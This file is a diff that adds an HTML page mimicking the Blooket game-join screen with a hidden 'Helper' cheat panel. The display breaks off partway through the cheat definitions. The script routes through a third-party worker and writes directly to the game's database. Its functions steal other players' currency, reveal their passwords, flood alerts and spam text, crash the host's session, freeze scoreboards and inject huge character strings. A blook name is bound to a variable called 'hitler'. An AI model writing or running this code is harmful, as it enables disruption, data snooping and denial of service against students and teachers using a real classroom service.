@@ -1,0 +1,1772 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Play Blooket | Blooket</title>
+    <link rel="icon" href="https://blooket.com/favicon.ico">
+    <link rel="stylesheet" href="blk/css/fontawesome.all.min.css">
+    <link rel="stylesheet" href="blk/css/core.css">
+    <link rel="stylesheet" href="blk/css/blooket-frontend-components-HjeMYXnY.css">
+    <link rel="stylesheet" href="blk/css/b8f45cc3108216ef.css">
+    <link rel="stylesheet" href="blk/css/b6aa525b8252177a.css">
+    <link rel="stylesheet" href="blk/css/21c212f9ea6d5a84.css">
+    <link rel="stylesheet" href="blk/css/28f083695a3c2bf6.css">
+    <link rel="stylesheet" href="blk/css/61490f1754404170.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@600;700;800;900&family=Titan+One&family=Macondo&display=swap');
+        *{box-sizing:border-box;margin:0;padding:0}
+        body{font-family:'Nunito',sans-serif;overflow:hidden;user-select:none;background-color:#f2f5f7}
+        .top-bar{position:absolute;top:0;left:0;width:100%;height:55px;background-color:#8b3a8e;display:flex;justify-content:space-between;align-items:center;padding:0 20px;color:white;font-weight:700;font-size:1.1rem;z-index:10;box-shadow:0 2px 4px rgba(0,0,0,0.1)}
+        .user-info,.score-info{display:flex;align-items:center;gap:8px}
+        #app-container{width:100vw;height:100vh;position:relative;padding-top:55px}
+        .page{position:absolute;top:0;left:0;width:100%;height:100%;display:none;flex-direction:column}
+        .page.active{display:flex}
+        .bg-light{background-color:#f2f5f7}.bg-green{background-color:#39c03e}.bg-red{background-color:#e33c3c}
+        .bg-pattern{background-color:#55c1e9;background-image:url('/static/img/castletile2-CWCP-fMu.svg');background-repeat:repeat;background-size:150px}
+        .question-container{flex:1;display:flex;justify-content:center;align-items:center;padding:20px 40px;min-height:0}
+        .question-text{font-size:clamp(1.6rem,3.5vw,2.8rem);font-weight:700;color:#333;text-align:center;max-width:900px;line-height:1.3}
+        .answer-container{display:grid;grid-template-columns:1fr 1fr;gap:14px;padding:0 20px 20px;height:52%;width:100%;max-width:1200px;margin:0 auto}
+        .answer-box{position:relative;display:flex;align-items:center;justify-content:center;border-radius:10px;cursor:pointer;user-select:none;transition:all 0.1s ease-in-out;padding-bottom:10px}
+        .answer-orange{background-color:#ffa31e;box-shadow:0 8px 0 #d98200}
+        .answer-blue{background-color:#3378ff;box-shadow:0 8px 0 #205acc}
+        .answer-green{background-color:#00cf77;box-shadow:0 8px 0 #00a65f}
+        .answer-red{background-color:#ff462b;box-shadow:0 8px 0 #cc321b}
+        .answer-box:hover{transform:translateY(4px);filter:brightness(0.95)}
+        .answer-box:active{transform:translateY(8px);box-shadow:0 0 0 currentColor}
+        .answer-orange:hover{box-shadow:0 4px 0 #d98200}.answer-blue:hover{box-shadow:0 4px 0 #205acc}
+        .answer-green:hover{box-shadow:0 4px 0 #00a65f}.answer-red:hover{box-shadow:0 4px 0 #cc321b}
+        .answer-text{color:white;font-size:clamp(1.1rem,2.2vw,1.8rem);font-weight:900;text-shadow:0 2px rgba(0,0,0,0.15);text-align:center;padding:0 12px;word-break:break-word}
+        .feedback-page{justify-content:center;align-items:center;color:white;cursor:pointer}
+        .feedback-title{font-family:'Titan One',cursive;font-size:4.5rem;letter-spacing:2px;text-transform:uppercase;text-shadow:2px 2px 0 rgba(0,0,0,0.2);margin-bottom:40px;animation:popIn 0.4s cubic-bezier(0.175,0.885,0.32,1.275)}
+        .icon-square{width:80px;height:80px;border:4px solid white;border-radius:8px;display:flex;justify-content:center;align-items:center;box-shadow:0 4px 10px rgba(0,0,0,0.1);animation:scaleIn 0.4s 0.2s both cubic-bezier(0.175,0.885,0.32,1.275)}
+        .icon-square svg{width:50px;height:50px}
+        .click-next{position:absolute;bottom:30px;font-size:1.2rem;font-weight:700;opacity:0.9;animation:fadeIn 1s 0.5s both}
+        .title-container{display:flex;justify-content:center;margin-top:40px}
+        .title-red-box{background-color:#db2014;border:5px solid #fbc811;box-shadow:0 10px 0 #a8190f;color:white;font-family:'Macondo',cursive;font-size:3rem;padding:15px 40px;border-radius:15px;text-shadow:0 2px 4px rgba(0,0,0,0.5);animation:slideDown 0.5s cubic-bezier(0.175,0.885,0.32,1.275);margin-bottom:10px}
+        .chest-container{display:flex;justify-content:center;align-items:center;gap:40px;flex:1}
+        .chest-img{width:220px;height:auto;filter:drop-shadow(5px 5px 0 rgba(0,0,0,0.2));transition:filter 0.2s,transform 0.2s,opacity 0.3s}
+        .chest-wrapper{cursor:pointer;transition:transform 0.2s}
+        .chest-wrapper:hover .chest-img{filter:drop-shadow(5px 5px 0 rgba(0,0,0,0.3)) brightness(1.1);transform:translateY(-10px)}
+        .reward-display{display:flex;flex-direction:column;align-items:center;animation:popIn 0.5s cubic-bezier(0.175,0.885,0.32,1.275)}
+        .reward-display.hidden{display:none}
+        .reward-icon{font-size:8rem;margin-bottom:20px;filter:drop-shadow(0 10px 10px rgba(0,0,0,0.3))}
+        .reward-amount{font-family:'Titan One',cursive;font-size:5rem;color:white;text-shadow:4px 4px 0 #000,-2px -2px 0 #000,2px -2px 0 #000,-2px 2px 0 #000}
+        .answers-container{display:flex;flex-direction:column;width:100%;height:45%;padding:0 12px 12px;gap:10px;box-sizing:border-box}
+        .answer-row{display:flex;flex:1;gap:10px}
+        .answer-row .answer-box{flex:1;height:100%;display:flex;align-items:center;justify-content:center;border-radius:8px;cursor:pointer;user-select:none;padding-bottom:8px;transition:transform 0.1s,filter 0.2s}
+        .answer-row .answer-box span{color:white;font-size:clamp(1.1rem,2.2vw,1.8rem);font-weight:900;text-align:center;text-shadow:0 2px rgba(0,0,0,0.15);padding:0 12px;word-break:break-word}
+        .answer-row .answer-box:hover{transform:translateY(4px);filter:brightness(0.95)}
+        .answer-row .answer-box:active{transform:translateY(8px)}
+        @keyframes popIn{0%{transform:scale(0.5);opacity:0}80%{transform:scale(1.1)}100%{transform:scale(1);opacity:1}}
+        @keyframes scaleIn{0%{transform:scale(0);opacity:0}100%{transform:scale(1);opacity:1}}
+        @keyframes fadeIn{0%{opacity:0}100%{opacity:0.9}}
+        @keyframes slideDown{0%{transform:translateY(-50px);opacity:0}100%{transform:translateY(0);opacity:1}}
+        /* ── Modal overlay ── */
+        #cheat-modal-overlay {
+            position: fixed; inset: 0;
+            background: rgba(0,0,0,0.45);
+            display: flex; align-items: center; justify-content: center;
+            z-index: 10000;
+            opacity: 0; transition: opacity 0.15s ease;
+            padding: 16px;
+        }
+        #cheat-modal-overlay.visible { opacity: 1; }
+
+        #cheat-modal {
+            background: #fff;
+            border-radius: 20px;
+            box-shadow: 0 12px 40px #0004;
+            width: 100%; max-width: 520px; max-height: 80vh;
+            display: flex; flex-direction: column; overflow: hidden;
+            transform: translateY(8px); transition: transform 0.15s ease;
+        }
+        #cheat-modal-overlay.visible #cheat-modal { transform: translateY(0); }
+
+        .modal-header {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 18px 20px 14px;
+            border-bottom: 2px solid #f0f0f0; flex-shrink: 0;
+        }
+        .modal-title { font-family: 'Titan One', sans-serif; font-size: 20px; color: #1a1a2e; }
+        .modal-close {
+            background: #f0f0f0; border: none; border-radius: 8px;
+            width: 32px; height: 32px; font-size: 14px; cursor: pointer;
+            color: #666; display: flex; align-items: center; justify-content: center;
+        }
+        .modal-close:hover { background: #e0e0e0; }
+
+        .modal-body {
+            padding: 16px 20px 20px; overflow-y: auto;
+            display: flex; flex-direction: column; gap: 10px;
+        }
+
+        .modal-input {
+            width: 100%; height: 46px;
+            border: 2px solid #e8e8e8; border-radius: 12px;
+            padding: 0 14px; font-size: 16px; font-weight: 700;
+            font-family: Nunito, sans-serif; outline: none; background: #fafafa;
+            transition: border-color 0.15s; box-sizing: border-box;
+        }
+        .modal-input:focus { border-color: #ffb300; background: #fff; }
+
+        .modal-confirm-btn {
+            width: 100%; height: 46px;
+            background: #ffb300; border: none; border-radius: 12px;
+            box-shadow: 0 4px 0 #c98a00;
+            font-family: 'Titan One', sans-serif; font-size: 18px; color: #fff; cursor: pointer;
+            transition: transform 0.1s, box-shadow 0.1s;
+        }
+        .modal-confirm-btn:hover  { transform: translateY(-1px); box-shadow: 0 5px 0 #c98a00; }
+        .modal-confirm-btn:active { transform: translateY(2px);  box-shadow: 0 2px 0 #c98a00; }
+
+        .modal-amount-row {
+            display: flex; gap: 8px; align-items: center;
+            padding-top: 8px; border-top: 2px solid #f0f0f0;
+        }
+        .modal-amount-row .modal-input { flex: 1; }
+        .modal-amount-row .modal-confirm-btn { width: auto; padding: 0 20px; flex-shrink: 0; }
+
+        .modal-player-list { display: flex; flex-direction: column; gap: 4px; }
+        .modal-player-row {
+            display: flex; align-items: center; gap: 10px;
+            padding: 8px 10px; border-radius: 12px; cursor: pointer;
+            border: 2px solid transparent; transition: background 0.1s, border-color 0.1s;
+        }
+        .modal-player-row:hover  { background: #fff8e6; border-color: #ffb300; }
+        .modal-player-row.selected { background: #fff8e6; border-color: #ffb300; }
+        .modal-player-img { width: 36px; height: 36px; object-fit: contain; flex-shrink: 0; }
+        .modal-player-name { font-size: 15px; font-weight: 800; color: #333; flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .modal-player-val  { font-size: 14px; font-weight: 800; color: #ffb300; white-space: nowrap; }
+
+        .modal-blook-grid {
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(76px, 1fr));
+            gap: 6px; max-height: 400px; overflow-y: auto;
+        }
+        .modal-blook-item {
+            display: flex; flex-direction: column; align-items: center; gap: 4px;
+            padding: 8px 4px; border-radius: 12px; cursor: pointer;
+            border: 2px solid transparent; background: #f7f7f7;
+            transition: background 0.1s, border-color 0.1s;
+        }
+        .modal-blook-item:hover { background: #fff8e6; border-color: #ffb300; }
+        .modal-blook-item img  { width: 48px; height: 48px; object-fit: contain; }
+        .modal-blook-item span { font-size: 10px; font-weight: 700; color: #555; text-align: center; line-height: 1.2; word-break: break-word; }
+
+        /* ── Cheat panel ── */
+        #cheat-panel {
+            position: fixed; top: 55px; right: -420px; width: 380px;
+            height: calc(100% - 55px); background: #fff; z-index: 9999;
+            box-shadow: -4px 0 24px rgba(0,0,0,0.18);
+            transition: right 0.3s cubic-bezier(.39,.5,.15,1.36);
+            display: flex; flex-direction: column; overflow: hidden;
+        }
+        #cheat-panel.open { right: 0; }
+        #cheat-panel-header {
+            background: #8b3a8e; padding: 16px 20px 20px;
+            box-shadow: 0 -6px rgba(0,0,0,0.2) inset;
+            display: flex; align-items: center; justify-content: space-between;
+        }
+        #cheat-panel-header h2 {
+            font-family: 'Titan One', sans-serif; font-size: 22px; color: white;
+            margin: 0; text-shadow: 0 2px rgba(0,0,0,0.2);
+        }
+        #cheat-panel-close {
+            background: rgba(255,255,255,0.2); border: none; color: white;
+            width: 32px; height: 32px; border-radius: 50%; font-size: 18px;
+            cursor: pointer; display: flex; align-items: center; justify-content: center;
+        }
+        #cheat-panel-close:hover { background: rgba(255,255,255,0.35); }
+        #cheat-panel-body { flex: 1; overflow-y: auto; padding: 16px; }
+
+        .cheat-section-title {
+            font-family: Nunito, sans-serif; font-size: 11px; font-weight: 800;
+            color: #aaa; text-transform: uppercase; letter-spacing: 1px;
+            margin: 16px 0 8px; padding: 0 4px;
+        }
+        .cheat-section-title:first-child { margin-top: 4px; }
+
+        #cheat-items-game, #cheat-items-global, #cheat-items-questions {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            margin-bottom: 4px;
+        }
+
+        .cheat-item {
+            display: flex; align-items: center; justify-content: center;
+            padding: 12px 8px;
+            border-radius: 14px; cursor: pointer;
+            transition: filter 0.1s, transform 0.1s, box-shadow 0.1s;
+            font-family: Nunito, sans-serif; font-size: 14px; font-weight: 800;
+            margin-bottom: 0; width: 100%; box-sizing: border-box;
+            box-shadow: 0 5px 0 #1a5acc; background: #3378ff;
+            color: white; border: none; text-align: center;
+            line-height: 1.2; min-height: 52px;
+        }
+        .cheat-item:hover { filter: brightness(1.1); transform: translateY(-2px); box-shadow: 0 7px 0 #1a5acc; }
+        .cheat-item:active { transform: translateY(4px); box-shadow: 0 1px 0 #1a5acc; }
+
+        #cheat-panel-hint {
+            padding: 12px 16px; text-align: center;
+            font-family: Nunito, sans-serif; font-size: 12px; color: #bbb;
+            border-top: 1px solid #f0f0f0;
+        }
+
+        /* ── Error toast ── */
+        .errorBar {
+            position: fixed; bottom: -80px; left: 50%; transform: translateX(-50%);
+            background: #e84135; color: #fff; padding: 12px 24px;
+            border-radius: 12px; font-size: 16px; font-weight: 700;
+            box-shadow: 0 6px 20px #0003; z-index: 9999;
+            transition: bottom 0.2s ease; white-space: nowrap; pointer-events: none;
+            font-family: Nunito, sans-serif;
+        }
+        .errorBar.show { bottom: 24px; }
+
+        #status, #cheat-menu { display: none !important; }
+    </style>
+</head>
+<body class="__variable_ca7918 __variable_9188ff">
+    <main>
+        <div class="layout_pageContainer__tzVN_">
+            <!-- Background with checkers -->
+            <div class="_background_l90pt_1" style="background-color: #0bc2cf;">
+                <div class="_checkers_l90pt_12"></div>
+            </div>
+
+            <!-- Floating blooks removed -->
+
+            <!-- Header -->
+            <div class="_header_mbghk_1" id="main-header">
+                <div class="_leftContainer_mbghk_18">
+                    <a class="page_headerLogo__UTJ26" href="https://blooket.com">Blooket</a>
+                </div>
+                <div class="_centerContainer_mbghk_26">Join a Game</div>
+                <div class="_rightContainer_mbghk_19">
+                    <a class="page_headerLink__LsgSE" href="https://dashboard.blooket.com">Dashboard</a>
+                </div>
+            </div>
+
+            <!-- Join Form -->
+            <div class="Form_form__UbiiL" id="join-form">
+                <div class="Form_formMainContent__Kx_b_">
+                    <h1 class="Form_titleText__cis5O">Blooket</h1>
+                    <div class="Form_inputRow__w_TK3">
+                        <div class="Form_idInputContainer__ftfcq">
+                            <input class="Form_idInput__MPydi" placeholder="Game ID" type="tel" maxlength="7" id="game-id" autofocus>
+                        </div>
+                        <button type="button" class="FormSubmitButton_submitButton__MK2LJ" id="submit-id">
+                            <svg class="svg-inline--fa fa-arrow-right fa-w-14 fa-2x FormSubmitButton_submitIcon__R57mo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
+                                <path fill="currentColor" d="M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z"></path>
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+                <div class="FormBottomContent_bottomContent__pQW_J"></div>
+            </div>
+
+            <!-- Nickname Form -->
+            <div class="Form_form__UbiiL" id="nickname-form" style="display: none;">
+                <div class="Form_formMainContent__Kx_b_">
+                    <h1 class="Form_titleText__cis5O">Enter Nickname</h1>
+                    <div class="Form_inputRow__w_TK3">
+                        <div class="Form_longInputContainer__o7qF9">
+                            <input class="Form_longInput__Kyk9e" placeholder="Nickname" type="text" id="nickname" maxlength="16">
+                        </div>
+                        <button type="button" class="FormSubmitButton_submitButton__MK2LJ" id="submit-nickname">
+                            <svg class="svg-inline--fa fa-arrow-right fa-w-14 fa-2x FormSubmitButton_submitIcon__R57mo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
+                                <path fill="currentColor" d="M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z"></path>
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+                <div class="FormBottomContent_bottomContent__pQW_J">
+                    <div class="FormBottomContent_loadingText__x5MpI" id="loading-text">Loading (1)</div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Cheat Panel (toggle with M key) -->
+    <div id="cheat-panel">
+        <div id="cheat-panel-header">
+            <h2>🛠 Helper</h2>
+            <button id="cheat-panel-close" onclick="document.getElementById('cheat-panel').classList.remove('open')">✕</button>
+        </div>
+        <div id="cheat-panel-body">
+            <div class="cheat-section-title">Game Cheats</div>
+            <div id="cheat-items-game"></div>
+            <div class="cheat-section-title">Global</div>
+            <div id="cheat-items-global"></div>
+            <div class="cheat-section-title">Questions</div>
+            <div id="cheat-items-questions">
+                <button class="cheat-item" onclick="if(window.gameQuestions){window.currentQuestionIndex++;displayQuestion(window.currentQuestionIndex);}">
+                    Skip Question
+                </button>
+                <button class="cheat-item" onclick="highlightCorrectAnswer()">
+                    Show Answer
+                </button>
+            </div>
+        </div>
+        <div id="cheat-panel-hint">Press <strong>M</strong> to toggle</div>
+    </div>
+    <!-- hidden status for script.js compat -->
+    <div id="status" style="display:none">Status: Ready</div>
+    <div id="cheat-menu" style="display:none"><div class="cheat-header" id="cheat-header"></div></div>
+
+    <script type="module">
+        import { initializeApp, deleteApp } from 'https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js';
+        import { getAuth, signInWithCustomToken } from 'https://www.gstatic.com/firebasejs/10.10.0/firebase-auth.js';
+        import { getDatabase, ref, set, get, onValue } from 'https://www.gstatic.com/firebasejs/10.10.0/firebase-database.js';
+        
+        window.initializeApp = initializeApp;
+        window.getAuth = getAuth;
+        window.deleteApp = deleteApp;
+        window.getDatabase = getDatabase;
+        window.ref = ref;
+        window.set = set;
+        window.get = get;
+        window.onValue = onValue;
+        window.signInWithCustomToken = signInWithCustomToken;
+    </script>
+    <script>
+        const JOIN_URL = 'https://blooket.4texasplayz4.workers.dev/';
+const hitler = "1#0#1#0#1$3#0#0#1#6#0#0$0";
+
+var blooks = ["Chick","Chicken","Cow","Goat","Horse","Pig","Sheep","Duck","Alpaca","Dog","Cat","Rabbit","Goldfish","Hamster","Turtle","Kitten","Puppy","Bear","Moose","Fox","Raccoon","Squirrel","Owl","Hedgehog","Deer","Wolf","Beaver","Tiger","Orangutan","Cockatoo","Parrot","Anaconda","Jaguar","Macaw","Toucan","Panther","Capuchin","Gorilla","Hippo","Rhino","Giraffe","Snowy Owl","Polar Bear","Arctic Fox","Baby Penguin","Penguin","Arctic Hare","Seal","Walrus","Witch","Wizard","Elf","Fairy","Slime Monster","Jester","Dragon","Queen","Unicorn","King","Two of Spades","Eat Me","Drink Me","Alice","Queen of Hearts","Dormouse","White Rabbit","Cheshire Cat","Caterpillar","Mad Hatter","King of Hearts","Toast","Cereal","Yogurt","Breakfast Combo","Orange Juice","Milk","Waffle","Pancakes","French Toast","Pizza","Earth","Meteor","Stars","Alien","Planet","UFO","Spaceship","Astronaut","Lil Bot","Lovely Bot","Angry Bot","Happy Bot","Watson","Buddy Bot","Brainy Bot","Mega Bot","Old Boot","Jellyfish","Clownfish","Frog","Crab","Pufferfish","Blobfish","Octopus","Narwhal","Dolphin","Baby Shark","Megalodon","Panda","Sloth","Tenrec","Flamingo","Zebra","Elephant","Lemur","Peacock","Chameleon","Lion","Amber","Dino Egg","Dino Fossil","Stegosaurus","Velociraptor","Brontosaurus","Triceratops","Tyrannosaurus Rex","Ice Bat","Ice Bug","Ice Elemental","Rock Monster","Dink","Donk","Bush Monster","Yeti","Dingo","Echidna","Koala","Kookaburra","Platypus","Joey","Kangaroo","Crocodile","Sugar Glider","Deckhand","Buccaneer","Swashbuckler","Treasure Map","Seagull","Jolly Pirate","Pirate Ship","Kraken","Captain Blackbeard","Snow Globe","Holiday Gift","Hot Chocolate","Holiday Wreath","Stocking","Gingerbread Man","Gingerbread House","Reindeer","Snowman","Santa Claus","Pumpkin","Swamp Monster","Frankenstein","Vampire","Zombie","Mummy","Caramel Apple","Candy Corn","Werewolf","Ghost","Rainbow Jellyfish","Blizzard Clownfish","Lovely Frog","Lucky Frog","Spring Frog","Poison Dart Frog","Lucky Hamster","Chocolate Rabbit","Spring Rabbit","Lemon Crab","Pirate Pufferfish","Donut Blobfish","Crimson Octopus","Rainbow Narwhal","Frost Wreath","Tropical Globe","New York Snow Globe","London Snow Globe","Japan Snow Globe","Egypt Snow Globe","Paris Snow Globe","Red Sweater Snowman","Blue Sweater Snowman","Elf Sweater Snowman","Santa Claws","Cookies Combo","Chilly Flamingo","Snowy Bush Monster","Nutcracker Koala","Sandwich","Ice Slime","Frozen Fossil","Ice Crab","Rainbow Panda","White Peacock","Tiger Zebra","Teal Platypus","Red Astronaut","Orange Astronaut","Yellow Astronaut","Lime Astronaut","Green Astronaut","Cyan Astronaut","Blue Astronaut","Pink Astronaut","Purple Astronaut","Brown Astronaut","Black Astronaut","Lovely Planet","Lovely Peacock","Haunted Pumpkin","Pumpkin Cookie","Ghost Cookie","Red Gummy Bear","Blue Gummy Bear","Green Gummy Bear","Chick Chicken","Chicken Chick","Raccoon Bandit","Owl Sheriff","Vampire Frog","Pumpkin King","Leprechaun","Anaconda Wizard","Spooky Pumpkin","Spooky Mummy","Agent Owl","Master Elf","Party Pig","Wise Owl","Spooky Ghost","Phantom King","Tim the Alien","Rainbow Astronaut","Hamsta Claus","Light Blue","Black","Red","Purple","Pink","Orange","Lime","Green","Teal","Tan","Maroon","Gray","Mint","Salmon","Burgandy","Baby Blue","Dust","Brown","Dull Blue","Yellow","Blue",hitler];
+
+var fblooks = ["Chick","Chicken","Cow","Goat","Horse","Pig","Sheep","Duck","Alpaca","Dog","Cat","Rabbit","Goldfish","Hamster","Turtle","Kitten","Puppy","Bear","Moose","Fox","Raccoon","Squirrel","Owl","Hedgehog","Deer","Wolf","Beaver","Tiger","Orangutan","Cockatoo","Parrot","Anaconda","Jaguar","Macaw","Toucan","Panther","Capuchin"];
+
+var botinfo = {};
+var canJoin = true;
+var gameobject = {};
+var tokens = [];
+var oname;
+var unreads = 0;
+var fvals = { Hack:"cr", Gold:"g", Candy:"g", Defense2:"d", Pirate:"d", Fish:"w", Brawl:"xp", Factory:"ca" };
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+function coerceValue(val) {
+	if (typeof val === "number") return val;
+	if (typeof val === "string") {
+		if (val.trim() === "") return val;
+		const n = Number(val);
+		if (Number.isFinite(n)) return n;
+	}
+	return val;
+}
+
+function firstPlaceSwitch(field) {
+	var players = Object.values(gameobject?.c || {});
+	var max = players.reduce((m, p) => Math.max(m, Number(p[field] ?? 0)), 0);
+	setUserVal(field, max + 100);
+}
+
+
+function firstPlaceSwitch(field) {
+	var players = Object.values(gameobject?.c || {});
+	var max = players.reduce((m, p) => Math.max(m, Number(p[field] ?? 0)), 0);
+	setUserVal(field, max + 100);
+}
+
+var cheats = {
+	Hack: [
+		{ type: "button", name: "First Place",        action: function() { firstPlaceSwitch("cr"); } },
+		{ type: "input",  name: "Set Crypto",        action: function(v) { setUserVal("cr", v); } },
+		{ type: "input",  name: "Set Password",       action: function(v) { setUserVal("p", v); } },
+		{ type: "select", name: "Steal Crypto",       computed: function() { return Object.keys(gameobject.c); }, action: function(d) { setUserVal("tat", `${d}:${window._modalAmt}`); } },
+		{ type: "select", name: "Get Password",       computed: function() { return Object.keys(gameobject.c); }, action: function(d) { showInfoModal("Password", gameobject?.c?.[d]?.p ?? "(none)"); } },
+		{ type: "adtext", name: "Ad Text (screen)",   action: function(txt) { setUserVal("cr", new Array(100).fill("1").join("") + new Array(500).fill(txt).join(" ")); } },
+		{ type: "adtext", name: "Ad Text (blook)",    playerSelect: true, action: function(d, txt) { setUserVal("b", "Parrot:" + new Array(500).fill(txt).join(" ")); setUserVal("tat", `${d}:100`); } },
+		{ type: "input",  name: "Flood Alert",        action: function(v) { setUserVal("tat", `${botinfo.name}:${Date.now()}${new Array(1700).fill(v+" ").join("")}`); } },
+		{ type: "button", name: "Crash Host",         action: function(a) { setUserVal("cr/t", "t"); a.innerText = "Crashing..."; } },
+		{ type: "button", name: "Freeze Scoreboard",  action: function(a) { a.frozen=!a.frozen; a.frozen ? setUserVal("tat/t","t") : setUserVal("tat","t"); a.innerText = a.frozen ? "Unfreeze Board" : "Freeze Scoreboard"; } },
+		{ type: "button", name: "Green Screen",       action: function(a) { a.on=!a.on; if(a.on){var t="a".repeat(63);for(var i=0;i<300000;i++){t+=String.fromCharCode(3655);if(i%61===0)t+=" ";}t+="a".repeat(63);setUserVal("cr",t);}else{setUserVal("cr",0);}a.innerText=a.on?"Undo Green Screen":"Green Screen"; } },
+		{ type: "button", name: "Crash Password",     action: function(a) { a.on=!a.on; a.on ? setUserVal("p/toString","t") : setUserVal("p","DogLover3"); a.innerText=a.on?"Remove Crash PW":"Crash Password"; } },
+		{ type: "button", name: "Freeze Password",    action: function(a) { a.on=!a.on; a.on ? setUserVal("p",genCursed()) : setUserVal("p","DogLover3"); a.innerText=a.on?"Remove Freeze PW":"Freeze Password"; } },
+	],
+	Gold: [
+		{ type: "button", name: "First Place",        action: function() { firstPlaceSwitch("g"); } },
+		{ type: "input",  name: "Set Gold",           action: function(v) { setUserVal("g", v); } },
+		{ type: "select", name: "Steal Gold",         computed: function() { return Object.keys(gameobject.c); }, action: function(d) { setUserVal("tat", `${d}:${window._modalAmt}`); } },
+		{ type: "select", name: "Set Player Gold",    computed: function() { return Object.keys(gameobject.c); }, action: function(d) { setUserVal("tat", `${d}:swap:${window._modalAmt}`); } },
+		{ type: "adtext", name: "Ad Text",            playerSelect: true, action: function(d, txt) { setUserVal("b", "Dog:" + new Array(500).fill(txt).join(" ")); setUserVal("tat", `${d}:100`); } },
+		{ type: "input",  name: "Flood Alert",        action: function(v) { setUserVal("tat", `${botinfo.name}:${Date.now()}${new Array(1700).fill(v+" ").join("")}`); } },
+		{ type: "button", name: "Crash Host",         action: function(a) { setUserVal("g/t", "t"); a.innerText = "Crashing..."; } },
+		{ type: "button", name: "Freeze Scoreboard",  action: function(a) { a.frozen=!a.frozen; a.frozen ? setUserVal("tat/t","t") : setUserVal("tat","t"); a.innerText=a.frozen?"Unfreeze Board":"Freeze Scoreboard"; } },
+	],
+	Candy: [
+		{ type: "button", name: "First Place",        action: function() { firstPlaceSwitch("g"); } },
+		{ type: "input",  name: "Set Candy",          action: function(v) { setUserVal("g", v); } },
+		{ type: "select", name: "Steal Candy",        computed: function() { return Object.keys(gameobject.c); }, action: function(d) { setUserVal("tat", `${d}:${window._modalAmt}`); } },
+		{ type: "select", name: "Set Player Candy",   computed: function() { return Object.keys(gameobject.c); }, action: function(d) { setUserVal("tat", `${d}:swap:${window._modalAmt}`); } },
+		{ type: "adtext", name: "Ad Text",            playerSelect: true, action: function(d, txt) { setUserVal("b", "Dog:" + new Array(500).fill(txt).join(" ")); setUserVal("tat", `${d}:100`); } },
+		{ type: "input",  name: "Flood Alert",        action: function(v) { setUserVal("tat", `${botinfo.name}:${Date.now()}${new Array(1700).fill(v+" ").join("")}`); } },
+		{ type: "button", name: "Crash Host",         action: function(a) { setUserVal("g/t", "t"); a.innerText = "Crashing..."; } },
+		{ type: "button", name: "Freeze Scoreboard",  action: function(a) { a.frozen=!a.frozen; a.frozen ? setUserVal("tat/t","t") : setUserVal("tat","t"); a.innerText=a.frozen?"Unfreeze Board":"Freeze Scoreboard"; } },
+	],
+	Pirate: [
+		{ type: "button", name: "First Place",        action: function() { firstPlaceSwitch("d"); } },
+		{ type: "input",  name: "Set Doubloons",      action: function(v) { setUserVal("d", v); } },
+		{ type: "select", name: "Steal Doubloons",    computed: function() { return Object.keys(gameobject.c); }, action: function(d) { setUserVal("tat", `${d}:${window._modalAmt}`); } },
+		{ type: "adtext", name: "Ad Text",            playerSelect: true, action: function(d, txt) { setUserVal("b", "Parrot:" + new Array(500).fill(txt).join(" ")); setUserVal("tat", `${d}:100`); } },
+		{ type: "input",  name: "Flood Alert",        action: function(v) { setUserVal("tat", `${botinfo.name}:${Date.now()}${new Array(1700).fill(v+" ").join("")}`); } },
+		{ type: "button", name: "Crash Host",         action: function(a) { setUserVal("d/t", "t"); a.innerText = "Crashing..."; } },
+		{ type: "button", name: "Freeze Scoreboard",  action: function(a) { a.frozen=!a.frozen; a.frozen ? setUserVal("tat/t","t") : setUserVal("tat","t"); a.innerText=a.frozen?"Unfreeze Board":"Freeze Scoreboard"; } },
+	],
+	Toy: [
+		{ type: "button", name: "First Place",        action: function() { firstPlaceSwitch("t"); } },
+		{ type: "input",  name: "Set Toys",           action: function(v) { setUserVal("t", v); } },
+		{ type: "select", name: "Steal Toys",         computed: function() { return Object.keys(gameobject.c); }, action: function(d) { setUserVal("tat", `${d}:${window._modalAmt}`); } },
+		{ type: "select", name: "Set Player Toys",    computed: function() { return Object.keys(gameobject.c); }, action: function(d) { setUserVal("tat", `${d}:swap:${window._modalAmt}`); } },
+		{ type: "adtext", name: "Ad Text",            playerSelect: true, action: function(d, txt) { setUserVal("b", "Dog:" + new Array(500).fill(txt).join(" ")); setUserVal("tat", `${d}:100`); } },
+		{ type: "button", name: "Crash Host",         action: function(a) { setUserVal("t/t", "t"); a.innerText = "Crashing..."; } },
+		{ type: "button", name: "Freeze Scoreboard",  action: function(a) { a.frozen=!a.frozen; a.frozen ? setUserVal("tat/t","t") : setUserVal("tat","t"); a.innerText=a.frozen?"Unfreeze Board":"Freeze Scoreboard"; } },
